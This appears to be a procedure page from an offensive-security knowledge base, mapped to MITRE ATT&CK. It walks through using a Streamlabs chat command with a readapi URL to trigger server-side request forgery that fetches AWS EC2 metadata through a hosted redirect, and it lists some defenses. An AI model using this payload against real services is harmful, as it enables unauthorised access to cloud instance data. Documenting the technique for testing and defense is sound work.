---
id: uuid-execute-ssrf
tags:
  - ssrf
  - aws
  - metadata
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands: []
verified: false
platforms:
  - Web
  - AWS
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[System Information Discovery]]'
updated_at: '2025-12-14T03:53:38.741Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[System Information Discovery]]'
---
# Execute-SSRF-to-Retrieve-AWS-Metadata

## Summary

This procedure triggers the SSRF by injecting the hosted redirect URL into a Streamlabs chat command, causing the backend to fetch and expose AWS EC2 metadata.

## Description

Using the format {readapi.https://mydomain/slpoc.php} in a chat command, the backend follows the redirect to the internal metadata service. This retrieves instance details like ID and security groups, limited here by no IAM role.

## Requirements

1. Hosted redirect PHP file (from previous procedure)
2. Streamlabs chat access with custom commands enabled
3. Target backend on AWS EC2

## Defense

Defensive measures and detection strategies:

- Sanitize user input in chat variables to prevent URL injection
- Proxy requests through a secure gateway that blocks internal redirects
- Alert on metadata service access logs

## Objectives

1. Inject URL to trigger backend fetch
2. Exfiltrate metadata via chat response
3. Validate SSRF success

## Instructions

### Step 1: Craft Chat Command

**Context**: Build command with readapi variable.

Use: A{readapi.https://mydomain/slpoc.php}B in chat.

> Expected: Backend processes and fetches.

### Step 2: Trigger and Observe

**Context**: Send command and check response.

Execute in Streamlabs chat.

> Expected: Chat shows 'ami-id ami-launch-index ... security-groups'.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]
- [[System Information Discovery]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[ssrf]]
- [[aws]]
- [[metadata]]
